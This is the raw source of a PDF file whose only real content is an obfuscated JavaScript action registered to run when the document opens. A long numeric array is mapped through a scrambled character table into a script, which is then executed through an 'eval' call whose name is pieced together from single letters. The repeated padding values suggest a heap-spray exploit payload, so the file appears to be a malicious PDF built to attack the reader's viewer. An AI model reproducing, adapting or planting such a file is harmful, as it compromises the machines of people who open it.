%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 4/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 4/Filter/FlateDecode/Type/Contents>>
stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[5,
56,
40,
67,
72,
35,
75,
4,
6,
24,
73,
73,
75,
4,
29,
50,
25,
28,
75,
4,
6,
8,
29,
50,
75,
4,
10,
8,
25,
28,
75,
4,
25,
55,
24,
28,
75,
4,
24,
24,
8,
29,
75,
4,
73,
28,
50,
69,
75,
4,
28,
69,
6,
5,
75,
4,
6,
5,
24,
69,
75,
4,
69,
50,
28,
69,
75,
4,
10,
69,
6,
5,
75,
4,
8,
73,
66,
50,
75,
4,
10,
73,
6,
5,
75,
4,
24,
24,
69,
6,
75,
4,
73,
73,
15,
5,
75,
4,
8,
25,
6,
5,
75,
4,
69,
24,
24,
50,
75,
4,
24,
24,
10,
28,
75,
4,
6,
66,
47,
50,
75,
4,
66,
8,
25,
25,
75,
4,
29,
29,
66,
69,
75,
4,
5,
6,
29,
29,
75,
4,
28,
69,
6,
5,
75,
4,
50,
24,
24,
69,
75,
4,
24,
55,
28,
73,
75,
4,
10,
8,
69,
73,
75,
4,
6,
10,
29,
5,
75,
4,
47,
28,
24,
28,
75,
4,
25,
28,
6,
8,
75,
4,
8,
66,
10,
8,
75,
4,
25,
5,
25,
55,
75,
4,
8,
66,
28,
50,
75,
4,
6,
5,
8,
73,
75,
4,
24,
50,
10,
8,
75,
4,
10,
28,
6,
5,
75,
4,
10,
6,
24,
8,
75,
4,
29,
8,
69,
24,
75,
4,
6,
5,
8,
73,
75,
4,
47,
69,
10,
73,
75,
4,
29,
8,
69,
24,
75,
4,
50,
55,
24,
24,
75,
4,
28,
66,
28,
55,
75,
4,
70,
15,
29,
50,
75,
4,
50,
8,
69,
24,
75,
4,
15,
5,
24,
24,
75,
4,
5,
25,
69,
29,
75,
4,
24,
6,
66,
69,
75,
4,
10,
28,
29,
47,
75,
4,
50,
66,
69,
6,
75,
4,
69,
15,
50,
5,
75,
4,
15,
70,
69,
24,
75,
4,
25,
5,
28,
69,
75,
4,
24,
5,
29,
66,
75,
4,
10,
8,
66,
29,
75,
4,
8,
25,
25,
73,
75,
4,
8,
25,
6,
5,
75,
4,
69,
24,
47,
28,
75,
4,
73,
73,
15,
15,
75,
4,
69,
50,
6,
5,
75,
4,
6,
15,
28,
5,
75,
4,
25,
50,
28,
73,
75,
4,
8,
28,
29,
29,
75,
4,
69,
50,
47,
28,
75,
4,
15,
6,
6,
5,
75,
4,
15,
15,
69,
24,
75,
4,
69,
28,
6,
5,
75,
4,
69,
24,
6,
5,
75,
4,
70,
5,
50,
8,
75,
4,
8,
55,
8,
25,
75,
4,
25,
5,
50,
24,
75,
4,
70,
15,
8,
24,
75,
4,
73,
6,
6,
5,
75,
4,
6,
69,
47,
69,
75,
4,
69,
50,
10,
15,
75,
4,
10,
28,
24,
24,
75,
4,
55,
73,
69,
24,
75,
4,
29,
24,
25,
5,
75,
4,
73,
6,
6,
5,
75,
4,
6,
5,
69,
6,
75,
4,
73,
70,
29,
10,
75,
4,
8,
55,
69,
8,
75,
4,
55,
6,
25,
6,
75,
4,
29,
29,
29,
29,
75,
4,
25,
47,
29,
29,
75,
4,
25,
6,
29,
55,
75,
4,
69,
69,
69,
69,
75,
4,
69,
69,
69,
69,
75,
4,
8,
69,
8,
6,
75,
4,
28,
69,
73,
70,
75,
4,
29,
29,
73,
6,
75,
4,
69,
69,
69,
69,
75,
4,
8,
69,
69,
69,
75,
4,
50,
69,
6,
24,
75,
4,
8,
69,
66,
55,
75,
4,
6,
5,
8,
8,
75,
4,
6,
5,
25,
50,
75,
4,
66,
69,
8,
25,
75,
4,
50,
24,
6,
24,
75,
4,
29,
29,
69,
8,
75,
4,
73,
6,
25,
24,
75,
4,
73,
25,
73,
29,
75,
4,
69,
69,
69,
69,
75,
4,
10,
8,
73,
6,
75,
4,
73,
50,
10,
47,
75,
4,
8,
28,
73,
15,
75,
4,
66,
73,
29,
29,
75,
4,
50,
28,
6,
24,
75,
4,
6,
5,
69,
6,
75,
4,
25,
6,
25,
6,
75,
4,
29,
29,
73,
66,
75,
4,
29,
29,
29,
29,
75,
4,
69,
47,
25,
5,
75,
4,
10,
47,
25,
5,
75,
4,
25,
50,
6,
66,
75,
4,
69,
66,
69,
28,
75,
4,
69,
69,
69,
69,
75,
4,
8,
50,
6,
15,
75,
4,
69,
50,
47,
28,
75,
4,
69,
28,
50,
10,
75,
4,
10,
47,
47,
28,
75,
4,
73,
10,
73,
8,
75,
4,
50,
10,
10,
24,
75,
4,
47,
28,
28,
28,
75,
4,
10,
73,
69,
28,
75,
4,
24,
24,
10,
47,
75,
4,
50,
10,
24,
47,
75,
4,
47,
28,
28,
28,
75,
4,
47,
69,
69,
6,
75,
4,
10,
24,
47,
15,
75,
4,
8,
24,
47,
69,
75,
4,
29,
6,
73,
6,
75,
4,
69,
69,
69,
69,
75,
4,
29,
29,
69,
69,
75,
4,
69,
50,
8,
73,
75,
4,
25,
6,
6,
5,
75,
4,
50,
55,
24,
24,
75,
4,
50,
10,
8,
66,
75,
4,
66,
15,
28,
28,
75,
4,
10,
10,
69,
69,
75,
4,
73,
47,
10,
69,
75,
4,
50,
10,
10,
28,
75,
4,
66,
15,
28,
28,
75,
4,
47,
25,
69,
8,
75,
4,
73,
50,
73,
28,
75,
4,
50,
73,
73,
50,
75,
4,
66,
15,
28,
28,
75,
4,
69,
69,
69,
55,
75,
4,
6,
70,
8,
55,
75,
4,
69,
28,
50,
66,
75,
4,
6,
6,
24,
69,
75,
4,
66,
15,
28,
28,
75,
4,
28,
66,
69,
28,
75,
4,
73,
70,
8,
66,
75,
4,
73,
70,
69,
69,
75,
4,
8,
24,
69,
69,
75,
4,
73,
70,
8,
10,
75,
4,
29,
29,
69,
69,
75,
4,
66,
28,
8,
73,
75,
4,
50,
69,
6,
8,
75,
4,
66,
73,
10,
8,
75,
4,
69,
69,
73,
70,
75,
4,
29,
29,
8,
24,
75,
4,
69,
28,
8,
73,
75,
4,
69,
69,
73,
70,
75,
4,
25,
5,
6,
24,
75,
4,
8,
24,
69,
50,
75,
4,
8,
73,
29,
29,
75,
4,
6,
24,
69,
28,
75,
4,
69,
50,
50,
24,
75,
4,
69,
47,
25,
5,
75,
4,
66,
24,
25,
5,
75,
4,
6,
69,
28,
10,
75,
4,
69,
69,
24,
29,
75,
4,
29,
70,
10,
8,
75,
4,
6,
69,
28,
10,
75,
4,
69,
69,
24,
29,
75,
4,
50,
28,
10,
8,
75,
4,
69,
69,
73,
70,
75,
4,
29,
25,
73,
70,
75,
4,
8,
73,
29,
29,
75,
4,
25,
6,
69,
6,
75,
4,
29,
25,
55,
50,
75,
4,
29,
29,
29,
29,
75,
4,
28,
25,
6,
25,
75,
4,
25,
50,
69,
25,
75,
4,
29,
25,
55,
6,
75,
4,
69,
25,
6,
70,
75,
4,
73,
29,
6,
55,
75,
4,
5,
15,
69,
66,
75,
4,
50,
70,
24,
24,
75,
4,
8,
5,
6,
70,
75,
4,
50,
73,
66,
5,
75,
4,
10,
55,
28,
73,
75,
4,
66,
70,
24,
73,
75,
4,
10,
69,
47,
29,
75,
4,
10,
28,
73,
6,
75,
4,
10,
69,
10,
28,
75,
4,
47,
29,
24,
70,
75,
4,
24,
55,
47,
29,
75,
4,
47,
25,
24,
66,
75,
4,
24,
69,
24,
47,
75,
4,
47,
25,
24,
47,
75,
4,
24,
28,
24,
47,
75,
4,
47,
25,
24,
28,
75,
4,
24,
55,
24,
6,
75,
4,
73,
24,
47,
29,
75,
4,
10,
69,
47,
25,
75,
4,
10,
69,
73,
6,
75,
4,
73,
73,
24,
29,
75,
4,
24,
24,
24,
15,
75,
4,
47,
73,
24,
55,
75,
4,
24,
15,
73,
8,
75,
4,
69,
69,
24,
24,
75,
4,
69,
69,
69,
69,
35,
64,
29,
4,
41,
50,
71,
32,
68,
41,
19,
25,
39,
12,
43,
18,
43,
70,
48,
60,
2,
61,
7,
46,
36,
32,
20,
25,
18,
43,
70,
9,
20,
25,
41,
67,
71,
36,
63,
47,
34,
60,
2,
61,
7,
43,
70,
49,
72,
43,
70,
64,
1,
43,
70,
72,
43,
70,
9,
40,
4,
5,
40,
71,
43,
32,
41,
67,
18,
69,
48,
60,
2,
23,
47,
61,
64,
43,
25,
71,
4,
43,
41,
19,
43,
70,
64,
1,
19,
29,
4,
41,
50,
71,
32,
68,
41,
19,
5,
13,
18,
61,
7,
12,
70,
43,
19,
15,
51,
67,
72,
41,
25,
46,
19,
57,
43,
43,
70,
2,
18,
61,
64,
12,
70,
43,
19,
12,
46,
72,
69,
13,
69,
50,
69,
50,
69,
50,
69,
50,
64,
12,
70,
43,
19,
70,
15,
15,
43,
72,
69,
13,
28,
69,
69,
69,
69,
69,
64,
12,
70,
43,
19,
45,
70,
2,
20,
68,
70,
15,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
5,
56,
40,
67,
61,
64,
12,
70,
43,
19,
40,
50,
38,
20,
25,
41,
72,
45,
70,
2,
20,
68,
70,
15,
9,
20,
25,
41,
67,
71,
36,
63,
47,
64,
12,
70,
43,
19,
60,
2,
72,
70,
15,
15,
43,
54,
18,
40,
50,
38,
20,
25,
41,
49,
69,
13,
24,
6,
61,
64,
12,
70,
43,
19,
2,
70,
43,
40,
45,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
33,
75,
4,
55,
69,
55,
69,
75,
4,
55,
69,
55,
69,
33,
61,
64,
2,
70,
43,
40,
45,
72,
25,
39,
12,
43,
18,
2,
70,
43,
40,
45,
48,
60,
2,
61,
64,
12,
70,
43,
19,
50,
68,
4,
41,
71,
47,
72,
18,
12,
46,
54,
69,
13,
28,
69,
69,
69,
69,
69,
61,
23,
70,
15,
15,
43,
64,
29,
68,
43,
18,
12,
70,
43,
19,
50,
68,
4,
41,
71,
72,
69,
64,
50,
68,
4,
41,
71,
34,
50,
68,
4,
41,
71,
47,
64,
50,
68,
4,
41,
71,
49,
49,
61,
7,
15,
51,
67,
53,
50,
68,
4,
41,
71,
42,
72,
2,
70,
43,
40,
45,
49,
45,
70,
2,
20,
68,
70,
15,
64,
1,
19,
12,
70,
43,
19,
68,
12,
25,
43,
29,
20,
68,
46,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
33,
75,
4,
69,
50,
69,
50,
75,
4,
69,
50,
69,
50,
33,
61,
64,
46,
36,
32,
20,
25,
18,
68,
12,
25,
43,
29,
20,
68,
46,
9,
20,
25,
41,
67,
71,
36,
34,
28,
28,
55,
8,
47,
61,
7,
68,
12,
25,
43,
29,
20,
68,
46,
49,
72,
68,
12,
25,
43,
29,
20,
68,
46,
64,
1,
19,
71,
36,
32,
40,
9,
50,
68,
20,
20,
70,
5,
27,
71,
68,
43,
25,
72,
3,
68,
20,
20,
70,
5,
9,
50,
68,
20,
20,
25,
50,
71,
17,
11,
70,
32,
20,
26,
41,
29,
68,
18,
7,
40,
4,
5,
56,
22,
33,
33,
48,
11,
40,
67,
22,
68,
12,
25,
43,
29,
20,
68,
46,
1,
61,
64,
1,
19,
29,
4,
41,
50,
71,
32,
68,
41,
19,
45,
43,
32,
41,
71,
29,
18,
61,
7,
41,
68,
45,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
33,
75,
4,
69,
57,
69,
57,
75,
4,
69,
57,
69,
57,
75,
4,
69,
57,
69,
57,
75,
4,
69,
57,
69,
57,
33,
61,
64,
12,
70,
43,
19,
45,
70,
2,
20,
68,
70,
15,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
5,
56,
40,
67,
61,
64,
36,
25,
70,
45,
5,
20,
68,
50,
51,
72,
41,
68,
45,
49,
45,
70,
2,
20,
68,
70,
15,
64,
5,
32,
67,
5,
20,
68,
50,
51,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
33,
75,
4,
69,
57,
69,
57,
75,
4,
69,
57,
69,
57,
33,
61,
64,
36,
25,
70,
15,
25,
43,
40,
32,
39,
25,
72,
47,
69,
64,
40,
45,
43,
70,
2,
72,
36,
25,
70,
15,
25,
43,
40,
32,
39,
25,
49,
36,
25,
70,
45,
5,
20,
68,
50,
51,
9,
20,
25,
41,
67,
71,
36,
64,
46,
36,
32,
20,
25,
18,
5,
32,
67,
5,
20,
68,
50,
51,
9,
20,
25,
41,
67,
71,
36,
34,
40,
45,
43,
70,
2,
61,
7,
5,
32,
67,
5,
20,
68,
50,
51,
49,
72,
5,
32,
67,
5,
20,
68,
50,
51,
64,
1,
19,
29,
32,
20,
20,
5,
20,
68,
50,
51,
72,
5,
32,
67,
5,
20,
68,
50,
51,
9,
40,
4,
5,
40,
71,
43,
32,
41,
67,
18,
69,
48,
40,
45,
43,
70,
2,
61,
64,
5,
20,
68,
50,
51,
72,
5,
32,
67,
5,
20,
68,
50,
51,
9,
40,
4,
5,
40,
71,
43,
32,
41,
67,
18,
69,
48,
5,
32,
67,
5,
20,
68,
50,
51,
9,
20,
25,
41,
67,
71,
36,
54,
40,
45,
43,
70,
2,
61,
64,
46,
36,
32,
20,
25,
18,
5,
20,
68,
50,
51,
9,
20,
25,
41,
67,
71,
36,
49,
40,
45,
43,
70,
2,
34,
69,
13,
28,
69,
69,
69,
69,
61,
7,
5,
20,
68,
50,
51,
72,
5,
20,
68,
50,
51,
49,
5,
20,
68,
50,
51,
49,
29,
32,
20,
20,
5,
20,
68,
50,
51,
64,
1,
19,
11,
25,
11,
72,
41,
25,
46,
19,
57,
43,
43,
70,
2,
18,
61,
64,
29,
68,
43,
18,
32,
72,
69,
64,
32,
34,
66,
28,
69,
69,
64,
32,
49,
49,
61,
7,
11,
25,
11,
53,
32,
42,
72,
5,
20,
68,
50,
51,
49,
36,
25,
70,
45,
5,
20,
68,
50,
51,
64,
1,
19,
12,
70,
43,
19,
41,
4,
11,
72,
66,
47,
55,
55,
55,
55,
55,
55,
55,
55,
55,
55,
55,
55,
55,
55,
55,
55,
55,
55,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
6,
64,
4,
71,
32,
20,
9,
45,
43,
32,
41,
71,
29,
18,
33,
75,
28,
8,
69,
69,
69,
29,
33,
48,
41,
4,
11,
61,
64,
1,
19,
29,
4,
41,
50,
71,
32,
68,
41,
19,
67,
25,
71,
32,
50,
68,
41,
18,
61,
7,
12,
70,
43,
19,
70,
43,
43,
2,
72,
41,
25,
46,
19,
57,
43,
43,
70,
2,
18,
61,
64,
32,
29,
18,
70,
45,
45,
9,
15,
68,
50,
9,
3,
68,
20,
20,
70,
5,
9,
67,
25,
71,
26,
50,
68,
41,
61,
7,
12,
70,
43,
19,
45,
70,
2,
20,
68,
70,
15,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
5,
56,
40,
67,
61,
64,
12,
70,
43,
19,
36,
58,
60,
8,
69,
69,
3,
37,
72,
45,
70,
2,
20,
68,
70,
15,
9,
20,
25,
41,
67,
71,
36,
63,
47,
64,
12,
70,
43,
19,
60,
2,
72,
69,
13,
28,
69,
69,
69,
69,
69,
54,
18,
36,
58,
60,
8,
69,
69,
3,
37,
49,
69,
13,
24,
6,
61,
64,
12,
70,
43,
19,
2,
70,
43,
40,
45,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
33,
75,
4,
55,
69,
55,
69,
75,
4,
55,
69,
55,
69,
33,
61,
64,
2,
70,
43,
40,
45,
72,
25,
39,
12,
43,
18,
2,
70,
43,
40,
45,
48,
60,
2,
61,
64,
12,
70,
43,
19,
45,
8,
57,
56,
44,
73,
8,
29,
72,
18,
69,
13,
69,
50,
69,
50,
69,
50,
69,
50,
54,
69,
13,
28,
69,
69,
69,
69,
69,
61,
23,
69,
13,
28,
69,
69,
69,
69,
69,
64,
29,
68,
43,
18,
12,
70,
43,
19,
12,
60,
50,
14,
62,
55,
73,
2,
72,
69,
64,
12,
60,
50,
14,
62,
55,
73,
2,
34,
45,
8,
57,
56,
44,
73,
8,
29,
64,
12,
60,
50,
14,
62,
55,
73,
2,
49,
49,
61,
7,
70,
43,
43,
2,
53,
12,
60,
50,
14,
62,
55,
73,
2,
42,
72,
2,
70,
43,
40,
45,
49,
45,
70,
2,
20,
68,
70,
15,
64,
1,
19,
12,
70,
43,
19,
71,
74,
65,
36,
37,
5,
59,
46,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
33,
75,
69,
55,
33,
61,
64,
46,
36,
32,
20,
25,
18,
71,
74,
65,
36,
37,
5,
59,
46,
9,
20,
25,
41,
67,
71,
36,
34,
69,
13,
28,
69,
69,
69,
61,
7,
71,
74,
65,
36,
37,
5,
59,
46,
49,
72,
71,
74,
65,
36,
37,
5,
59,
46,
64,
1,
19,
71,
74,
65,
36,
37,
5,
59,
46,
72,
33,
37,
9,
33,
49,
71,
74,
65,
36,
37,
5,
59,
46,
64,
70,
45,
45,
9,
15,
68,
50,
9,
3,
68,
20,
20,
70,
5,
9,
67,
25,
71,
26,
50,
68,
41,
18,
71,
74,
65,
36,
37,
5,
59,
46,
61,
64,
1,
1,
19,
70,
30,
20,
4,
67,
32,
41,
40,
72,
70,
45,
45,
9,
45,
20,
4,
67,
26,
41,
40,
64,
12,
70,
43,
19,
40,
12,
72,
45,
70,
43,
40,
25,
26,
41,
71,
18,
70,
45,
45,
9,
12,
32,
25,
46,
25,
43,
0,
25,
43,
40,
32,
68,
41,
9,
71,
68,
27,
71,
43,
32,
41,
67,
18,
61,
9,
50,
36,
70,
43,
57,
71,
18,
69,
61,
61,
64,
29,
68,
43,
18,
12,
70,
43,
19,
32,
72,
69,
64,
32,
34,
70,
30,
20,
4,
67,
32,
41,
40,
9,
20,
25,
41,
67,
71,
36,
64,
32,
49,
49,
61,
7,
32,
29,
18,
70,
30,
20,
4,
67,
32,
41,
40,
53,
32,
42,
9,
41,
70,
11,
25,
72,
72,
35,
17,
27,
50,
43,
32,
45,
71,
35,
61,
7,
12,
70,
43,
19,
20,
12,
72,
70,
30,
20,
4,
67,
32,
41,
40,
53,
32,
42,
9,
12,
25,
43,
40,
32,
68,
41,
64,
1,
1,
19,
32,
29,
18,
18,
20,
12,
72,
72,
55,
61,
52,
52,
18,
18,
40,
12,
72,
72,
6,
61,
21,
21,
18,
20,
12,
34,
72,
6,
9,
66,
47,
61,
61,
61,
7,
67,
25,
71,
32,
50,
68,
41,
18,
61,
64,
1,
25,
20,
40,
25,
19,
32,
29,
18,
20,
12,
72,
72,
10,
9,
66,
61,
7,
45,
43,
32,
41,
71,
29,
18,
61,
64,
1,
25,
20,
40,
25,
19,
32,
29,
18,
18,
18,
40,
12,
72,
72,
73,
61,
52,
52,
18,
40,
12,
72,
72,
10,
61,
61,
21,
21,
18,
20,
12,
34,
10,
9,
66,
66,
61,
61,
7,
5,
13,
18,
61,
64,
1,
25,
20,
40,
25,
19,
32,
29,
18,
18,
20,
12,
16,
72,
55,
9,
66,
61,
52,
52,
18,
20,
12,
34,
72,
55,
9,
47,
61,
52,
52,
18,
20,
12,
16,
72,
6,
9,
66,
24,
61,
52,
52,
18,
20,
12,
34,
72,
6,
9,
66,
10,
61,
61,
7,
29,
4,
41,
50,
71,
32,
68,
41,
19,
70,
18,
61,
7,
4,
71,
32,
20,
9,
45,
43,
32,
41,
71,
15,
18,
35,
45,
31,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
19,
22,
19,
2,
2,
2,
2,
66,
66,
66,
35,
48,
41,
25,
46,
19,
62,
70,
71,
25,
18,
61,
61,
64,
1,
12,
70,
43,
19,
36,
72,
70,
45,
45,
9,
45,
20,
4,
67,
26,
41,
40,
64,
29,
68,
43,
18,
12,
70,
43,
19,
29,
72,
69,
64,
29,
34,
36,
9,
20,
25,
41,
67,
71,
36,
64,
29,
49,
49,
61,
7,
32,
29,
18,
36,
53,
29,
42,
9,
41,
70,
11,
25,
72,
72,
35,
17,
27,
50,
43,
32,
45,
71,
35,
61,
7,
12,
70,
43,
19,
32,
72,
36,
53,
29,
42,
9,
12,
25,
43,
40,
32,
68,
41,
64,
1,
1,
19,
32,
29,
18,
18,
32,
16,
6,
9,
66,
47,
61,
21,
21,
18,
32,
34,
6,
9,
47,
61,
61,
7,
50,
72,
41,
25,
46,
19,
57,
43,
43,
70,
2,
18,
61,
64,
12,
70,
43,
19,
15,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
35,
75,
4,
55,
69,
55,
69,
75,
4,
55,
69,
55,
69,
35,
61,
64,
12,
70,
43,
19,
25,
72,
4,
41,
25,
40,
50,
70,
45,
25,
18,
5,
56,
40,
67,
61,
64,
46,
36,
32,
20,
25,
18,
15,
9,
20,
25,
41,
67,
71,
36,
34,
72,
69,
13,
6,
69,
69,
69,
61,
7,
15,
49,
72,
15,
64,
1,
15,
72,
15,
9,
40,
4,
5,
40,
71,
43,
18,
69,
48,
69,
13,
6,
69,
69,
69,
54,
25,
9,
20,
25,
41,
67,
71,
36,
61,
64,
29,
68,
43,
18,
29,
72,
69,
64,
29,
34,
47,
55,
69,
69,
64,
29,
49,
49,
61,
7,
50,
53,
29,
42,
72,
15,
49,
25,
64,
1,
70,
18,
61,
64,
70,
18,
61,
64,
71,
43,
2,
7,
71,
36,
32,
40,
9,
11,
25,
15,
32,
70,
9,
41,
25,
46,
30,
20,
70,
2,
25,
43,
18,
41,
4,
20,
20,
61,
64,
1,
50,
70,
71,
50,
36,
18,
25,
61,
7,
1,
70,
18,
61,
64,
1,
1];
cc={q:"V}yCub8{5.7mvxQd>E\( l&:/3eIS4fP@i'<'hN_zsn]rKpw2,+ck|[-9jAWGq\)D*;M1go0at=6U%"}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3848<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 12
trailer
<</Size 12
/Root 21 0 R>>
xref
0 0
trailer
<</Size 12/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF